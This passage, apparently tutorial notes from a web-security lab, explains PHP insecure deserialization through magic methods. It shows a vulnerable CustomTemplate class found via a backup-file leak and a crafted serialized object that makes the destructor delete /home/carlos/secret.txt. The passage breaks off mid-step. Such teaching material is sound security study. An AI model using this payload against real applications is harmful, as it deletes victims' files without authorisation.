In OOP, the methods available to an object are determined by its class. Therefore, if an attacker is able to manipulate which class of object is being passed in as serialized data, they can influence what code is executed during or after the deserialization process.

This vulnerability that occur due to insecure deserialization can open up many more exploit possibilities within an application. Since deserialization methods usually do not check for the object or class type of the data they are deserializing. An attacker can pass objects of any serializable class that is available to the application, allowing them to create instances of arbitrary classes.

While the unexpected object type might cause an exception in the application logic, the malicious object would have already been instantiated by then (magic methods).
## Example
1. Assume that an application accepts serialized data from a user-controlled input. In which the application then deserializes this data using the `unserialize()` function.
2. An attacker was able to perform information disclosure by adding `~` at the end of the URL (`target.com/CustomTemplate.php~`) and is able to view the following file:
```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
?>
```
3. An attacker can then create their own serialized data using the class and object above, and replace the original and submit it to the application, to do damage on the target, such as deleting a file in this example:
```txt
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/secret.txt";}
```
4. When the application deserializes this 